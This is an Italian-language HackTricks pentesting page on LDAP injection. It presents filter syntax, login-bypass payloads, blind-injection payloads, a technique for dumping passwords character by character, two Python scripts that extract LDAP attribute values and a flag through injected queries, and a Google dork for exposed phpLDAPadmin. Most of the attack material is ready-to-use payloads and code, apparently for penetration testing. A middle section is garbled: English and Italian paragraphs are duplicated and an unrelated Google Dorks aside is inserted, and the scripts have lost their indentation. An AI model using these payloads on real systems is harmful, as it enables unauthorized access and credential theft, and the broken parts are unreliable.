# Iniezione LDAP

## Iniezione LDAP

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium di **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare ricompense fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Iniezione LDAP

### **LDAP**

**Se vuoi sapere cos'√® LDAP, accedi alla seguente pagina:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**L'iniezione LDAP** √® un attacco che mira alle applicazioni web che costruiscono dichiarazioni LDAP a partire dall'input dell'utente. Si verifica quando l'applicazione **non riesce a sanificare correttamente** l'input, consentendo agli attaccanti di **manipolare le dichiarazioni LDAP** attraverso un proxy locale, potenzialmente portando a un accesso non autorizzato o alla manipolazione dei dati.

{% file src="../.gitbook/assets/en-blackhat-europe-2008-ldap-injection-blind-ldap-injection.pdf" %}

**Filtro** = ( filtercomp )\
**Filtercomp** = and / or / not / item\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= simple / present / substring\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr ‚Äù=‚Äù \[initial] \* \[final]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
**(&)** = Absolute TRUE\
**(|)** = Absolute FALSE

Ad esempio:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

√à possibile accedere al database, che pu√≤ contenere informazioni di molti tipi diversi.

**OpenLDAP**: se arrivano 2 filtri, esegue solo il primo.\
**ADAM o Microsoft LDS**: con 2 filtri generano un errore.\
**SunOne Directory Server 5.0**: esegue entrambi i filtri.

**√à molto importante inviare il filtro con la sintassi corretta o verr√† generato un errore. √à meglio inviare solo 1 filtro.**

Il filtro deve iniziare con: `&` o `|`\
Esempio: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

Quindi: `(&(objectClass=`**`*)(ObjectClass=*))`** sar√† il primo filtro (quello eseguito).

### Bypass del login

LDAP supporta diversi formati per memorizzare la password: chiaro, md5, smd5, sh1, sha, crypt. Quindi, potrebbe essere che indipendentemente da ci√≤ che inserisci all'interno della password, questa viene crittografata.
```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) ‚Äî> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
#### Liste

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [Attributi LDAP](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [Attributi LDAP PosixAccount](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### Iniezione LDAP cieca

√à possibile forzare risposte False o True per verificare se vengono restituiti dati e confermare una possibile iniezione LDAP cieca:
```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### Dump dati

Puoi iterare sui caratteri ascii, cifre e simboli:
```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```
### Script

#### **Scoprire campi LDAP validi**

Gli oggetti LDAP **contengono di default diversi attributi** che potrebbero essere utilizzati per **salvare informazioni**. Puoi provare a **forzare tutti loro per estrarre quelle informazioni**. Puoi trovare una lista di [**attributi LDAP di default qui**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt).
```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```
#### **Iniezione LDAP Blind Speciale (senza "\*")**

------------------------------------------------------------------------------------------------------------------------------

##### **Summary**

##### **Sommario**

LDAP injection is a type of attack that targets applications that use LDAP (Lightweight Directory Access Protocol) for user authentication and data storage. It occurs when an attacker is able to manipulate the input parameters of an LDAP query, allowing them to modify the query's behavior and potentially gain unauthorized access to sensitive information.

L'iniezione LDAP √® un tipo di attacco che mira alle applicazioni che utilizzano LDAP (Lightweight Directory Access Protocol) per l'autenticazione degli utenti e la memorizzazione dei dati. Si verifica quando un attaccante √® in grado di manipolare i parametri di input di una query LDAP, consentendo loro di modificare il comportamento della query e potenzialmente ottenere accesso non autorizzato a informazioni sensibili.

##### **Exploiting LDAP Injection**

##### **Sfruttare l'Iniezione LDAP**

One common technique used in LDAP injection attacks is to inject a wildcard character ("\*") into the query, which allows the attacker to bypass input validation and retrieve all records from the LDAP server. However, some applications may have implemented input sanitization measures that remove or escape the wildcard character, making this technique ineffective.

Una tecnica comune utilizzata negli attacchi di iniezione LDAP √® l'inserimento di un carattere jolly ("\*") nella query, che consente all'attaccante di eludere la convalida dell'input e recuperare tutti i record dal server LDAP. Tuttavia, alcune applicazioni potrebbero aver implementato misure di sanificazione dell'input che rimuovono o escludono il carattere jolly, rendendo questa tecnica inefficace.

In such cases, a special blind LDAP injection technique can be used. This technique involves injecting LDAP filter conditions that are always true or always false, depending on the desired outcome. By carefully crafting the injected conditions, the attacker can infer information about the LDAP server and its data without relying on the wildcard character.

In tali casi, √® possibile utilizzare una tecnica speciale di iniezione LDAP cieca. Questa tecnica prevede l'inserimento di condizioni di filtro LDAP che sono sempre vere o sempre false, a seconda dell'esito desiderato. Scegliendo attentamente le condizioni iniettate, l'attaccante pu√≤ dedurre informazioni sul server LDAP e sui suoi dati senza fare affidamento sul carattere jolly.

##### **Example**

##### **Esempio**

Let's consider an application that uses LDAP for user authentication and has a login form with two input fields: "username" and "password". The application constructs an LDAP query using the input values and checks if the query returns any results. If it does, the user is authenticated.

Consideriamo un'applicazione che utilizza LDAP per l'autenticazione degli utenti e ha un modulo di accesso con due campi di input: "username" e "password". L'applicazione costruisce una query LDAP utilizzando i valori di input e verifica se la query restituisce risultati. Se lo fa, l'utente viene autenticato.

To perform a blind LDAP injection attack, the attacker can manipulate the input values in a way that injects a custom LDAP filter condition. For example, the attacker can input a username value of ")(|(username=*)" to inject a condition that is always true, resulting in the LDAP query returning all user records.

Per eseguire un attacco di iniezione LDAP cieca, l'attaccante pu√≤ manipolare i valori di input in modo da iniettare una condizione di filtro LDAP personalizzata. Ad esempio, l'attaccante pu√≤ inserire un valore di username di ")(|(username=*)" per iniettare una condizione che √® sempre vera, con il risultato che la query LDAP restituisce tutti i record degli utenti.

Similarly, the attacker can inject a condition that is always false, such as ")(!(username=*))", to prevent any user records from being returned by the LDAP query.

Allo stesso modo, l'attaccante pu√≤ iniettare una condizione che √® sempre falsa, come ")(!(username=*))", per impedire che vengano restituiti record degli utenti dalla query LDAP.

By observing the application's response to different injected conditions, the attacker can gather information about the LDAP server's structure, data, and potentially even perform more advanced attacks.

Osservando la risposta dell'applicazione a diverse condizioni iniettate, l'attaccante pu√≤ raccogliere informazioni sulla struttura del server LDAP, sui dati e potenzialmente anche eseguire attacchi pi√π avanzati.
```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```
### Google Dorks

### Dorks di Google

Google Dorks are special search queries that can be used to find specific information on the internet. These queries can be used to search for vulnerabilities, sensitive information, or even to find specific websites or files.

I Google Dorks sono query di ricerca speciali che possono essere utilizzate per trovare informazioni specifiche su Internet. Queste query possono essere utilizzate per cercare vulnerabilit√†, informazioni sensibili o anche per trovare siti web o file specifici.

Google Dorks can be very useful during the reconnaissance phase of a penetration test, as they can help identify potential targets and gather information about them. However, it is important to use Google Dorks responsibly and ethically, as they can also be used for malicious purposes.

I Google Dorks possono essere molto utili durante la fase di ricognizione di un test di penetrazione, in quanto possono aiutare a identificare potenziali bersagli e a raccogliere informazioni su di essi. Tuttavia, √® importante utilizzare i Google Dorks in modo responsabile ed etico, in quanto possono anche essere utilizzati a scopi maligni.

Here are some examples of Google Dorks:

Ecco alcuni esempi di Google Dorks:

- `site:example.com intext:password` - This dork searches for the word "password" within the website example.com.
- `site:example.com intext:password` - Questo dork cerca la parola "password" all'interno del sito web example.com.

- `filetype:pdf site:example.com` - This dork searches for PDF files within the website example.com.
- `filetype:pdf site:example.com` - Questo dork cerca file PDF all'interno del sito web example.com.

- `inurl:admin site:example.com` - This dork searches for pages with "admin" in the URL within the website example.com.
- `inurl:admin site:example.com` - Questo dork cerca pagine con "admin" nell'URL all'interno del sito web example.com.

These are just a few examples, and there are many more Google Dorks that can be used for different purposes. It is important to experiment and explore different dorks to find the information you are looking for.

Questi sono solo alcuni esempi e ci sono molti altri Google Dorks che possono essere utilizzati per scopi diversi. √à importante sperimentare ed esplorare diversi dorks per trovare le informazioni che stai cercando.
```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```
### Altri Payloads

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consiglio per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per bug bounty creata da hacker, per hacker! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare ricompense fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
